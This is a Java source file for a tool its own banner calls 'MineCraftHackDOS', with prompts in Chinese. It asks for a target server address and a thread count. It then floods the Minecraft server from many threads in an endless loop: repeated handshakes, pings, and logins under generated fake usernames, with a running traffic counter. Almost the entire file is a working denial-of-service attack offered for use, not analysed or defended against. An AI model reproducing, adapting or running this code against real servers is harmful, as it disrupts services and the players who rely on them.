import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;


public class Main {
    public static long data = 0;
    public static String[] part1;
    public static int port;
    public static byte[] hand;
    public static byte[] login;
    public static byte[] ping;
    public static byte[] pack;
    public static int version = -1;
    public static long killT = 0;
    public static long point = 0;
    public static String text = "";

    public static void main(String[] args) {

        // TODO 自动生成的方法存根
        System.out.println("欢迎使用MineCraftHackDOS,作者:小正QQ1419158026");
        Scanner s = new Scanner(System.in);
        System.out.print("请输入服务器完整地址(如127.0.0.1:25565):");
        String ip = s.nextLine();
        System.out.print("请输入线程数量");
        String threadNum = s.nextLine();
        Main.part1 = ip.split(":");
        Main.port = Integer.parseInt(part1[1]);
        int num = Integer.parseInt(threadNum);
        System.out.print("请输入干扰字符PS不能是中文！:");
        text = s.nextLine();
        System.out.println("正在存入缓存");


        //握手包数据流初始化 P1
        ByteArrayOutputStream b;
        DataOutputStream handshake;
        //第一次握手 P2
        try {
            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            //版本号未知
            Main.writeVarInt(handshake, -1);
            //ip地址长度
            Main.writeVarInt(handshake, Main.part1[0].length());
            //ip
            handshake.writeBytes(Main.part1[0]);
            //port
            handshake.writeShort(Main.port);
            //state (1 for handshake)
            Main.writeVarInt(handshake, 1);
            hand = b.toByteArray();

            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x01);
            handshake.writeLong(Long.MAX_VALUE);
            ping = b.toByteArray();

            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            pack = b.toByteArray();

        } catch (IOException e) {
            // TODO 自动生成的 catch 块
            e.printStackTrace();
        }//先握手

        System.out.println("正在探测版本..");
        boolean lock = true;
        try {
            Socket s1 = new Socket(Main.part1[0], Main.port);
            //流准备
            InputStream is = s1.getInputStream();
            DataInputStream di = new DataInputStream(is);
            OutputStream os = s1.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);

            //握手
            //prepend size
            Main.writeVarInt(dos, Main.hand.length);
            //write handshake packet
            dos.write(Main.hand);
            //跟小包
            //prepend size
            Main.writeVarInt(dos, Main.pack.length);
            //write handshake packet
            dos.write(Main.pack);
            dos.flush();
            //读包大小
            Main.data = Main.data + Main.readVarInt(di);
            Main.readVarInt(di);
            byte[] temp1 = new byte[Main.readVarInt(di)];
            di.readFully(temp1);

            String motdT = new String(temp1);
            JsonParser json = new JsonParser();
            JsonElement part5 = json.parse(motdT);
            JsonElement part6 = part5.getAsJsonObject().get("version");
            System.out.println("服务器版本:" + part6.getAsJsonObject().get("name").getAsString() + ",协议版本号:" + part6.getAsJsonObject().get("protocol").getAsInt());
            version = part6.getAsJsonObject().get("protocol").getAsInt();

            di.close();
            is.close();
            dos.close();
            os.close();
            s1.close();
        } catch (Exception e) {
            lock = false;
            e.printStackTrace();
            System.out.print("探测失败，请手动输入协议版本号:");
            version = Integer.parseInt(s.nextLine());
        }
        if (lock) {
            System.out.print("刚才探测到的是否是真的协议版本号？[y/n]:");
            String temp = s.nextLine();
            if ((!temp.equals("y")) && (!temp.equals("Y"))) {
                System.out.print("请输入正确的协议版本号:");
                version = Integer.parseInt(s.nextLine());
            }
        }
        try {
            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            Main.writeVarInt(handshake, version);//版本号未知
            Main.writeVarInt(handshake, Main.part1[0].length()); //ip地址长度
            handshake.writeBytes(Main.part1[0]); //ip
            handshake.writeShort(Main.port); //port
            Main.writeVarInt(handshake, 2); //state (1 for handshake)
            login = b.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("正在启动线程PS:长时间显示\"[MineCraftHackDOS]>0byte\"信息则为攻击失败");
        Runnable thread4 = new Thread4();
        Thread thread3 = new Thread(thread4);
        thread3.start();//启动解析线程
        for (int i = 1; i <= num; i++) {
            Runnable thread1 = new Thread1();
            Thread thread2 = new Thread(thread1);
            thread2.start();//启动解析线程
        }

    }

    public static int readVarInt(DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        while (true) {
            int k = in.readByte();
            i |= (k & 0x7F) << j++ * 7;
            if (j > 5) {
                throw new RuntimeException("VarInt太大");
            }
            if ((k & 0x80) != 128) {
                break;
            }
        }
        return i;
    }

    public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
        while (true) {
            if ((paramInt & 0xFFFFFF80) == 0) {
                out.writeByte(paramInt);
                return;
            }
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
    }
}

class Thread1 implements Runnable {
    @Override
    public void run() {
        while (true) {
            try {
                Socket s = new Socket(Main.part1[0], Main.port);
                //流准备
                InputStream is = s.getInputStream();
                DataInputStream di = new DataInputStream(is);
                OutputStream os = s.getOutputStream();
                DataOutputStream dos = new DataOutputStream(os);
                int temp;

                //握手
                Main.writeVarInt(dos, Main.hand.length); //prepend size
                dos.write(Main.hand); //write handshake packet
                //跟小包
                Main.writeVarInt(dos, Main.pack.length); //prepend size
                dos.write(Main.pack); //write handshake packet
                dos.flush();

                Main.data = Main.data + Main.readVarInt(di);//读包大小
                Main.readVarInt(di);
                byte[] temp1 = new byte[Main.readVarInt(di)];
                di.readFully(temp1);

                try {
                    //ping包
                    Main.writeVarInt(dos, Main.ping.length); //prepend size
                    dos.write(Main.ping); //write handshake packet
                    dos.flush();
                    Main.data = Main.data + Main.readVarInt(di);
                    Main.readVarInt(di);
                    di.readLong();
                    //di.readLong();
                } catch (Exception e) {

                }

                di.close();
                is.close();
                dos.close();
                os.close();
                s.close();

                s = new Socket(Main.part1[0], Main.port);
                //流准备
                is = s.getInputStream();
                di = new DataInputStream(is);
                os = s.getOutputStream();
                dos = new DataOutputStream(os);
                //第二次握手
                Main.writeVarInt(dos, Main.login.length); //prepend size
                dos.write(Main.login); //write handshake packet
                ByteArrayOutputStream b;
                DataOutputStream handshake;
                b = new ByteArrayOutputStream();
                handshake = new DataOutputStream(b);
                handshake.write(0x00);
                String temp5 = Main.text + Main.point;
                Main.point++;
                Main.writeVarInt(handshake, temp5.length());
                handshake.writeBytes(temp5);
                byte[] username = b.toByteArray();
                Main.writeVarInt(dos, username.length); //prepend size
                dos.write(username); //write handshake packet
                dos.flush();
                s.setSoTimeout(1500);
                while (true) {
                    try {
                        int length = Main.readVarInt(di);
                        Main.data = Main.data + length;
                        byte[] lj = new byte[length];
                        di.readFully(lj);
                    } catch (Exception e) {
                        break;
                    }
                }
                //main.data=main.data+main.readVarInt(di);<--老子不要这个数据了
                di.close();
                is.close();
                dos.close();
                os.close();
                s.close();
            } catch (Exception e) {
                // TODO 自动生成的 catch 块
                //e.printStackTrace();
                Main.killT++;
                //e.printStackTrace();
            }
        }
    }
}

class Thread4 implements Runnable {
    @Override
    public void run() {
        try {
            while (true) {
                Thread.sleep(3000);
                if (Main.data >= 1024 * 1024 * 1024) {
                    double a = Main.data / (1024.0 * 1024.0 * 1024.0);
                    System.out.println("[MineCraftHackDOS]>" + a + "kb," + Main.killT + "thread");
                    continue;
                }
                if (Main.data >= 1024 * 1024) {
                    double a = Main.data / (1024.0 * 1024.0);
                    System.out.println("[MineCraftHackDOS]>" + a + "mb," + Main.killT + "thread");
                    continue;
                }
                if (Main.data >= 1024) {
                    double a = Main.data / 1024.0;
                    System.out.println("[MineCraftHackDOS]>" + a + "kb," + Main.killT + "thread");
                    continue;
                }
                if (Main.data < 1024) {
                    System.out.println("[MineCraftHackDOS]>" + Main.data + "byte," + Main.killT + "thread");
                    continue;
                }
            }
        } catch (InterruptedException e) {
            // TODO 自动生成的 catch 块
            e.printStackTrace();
        }

    }
}

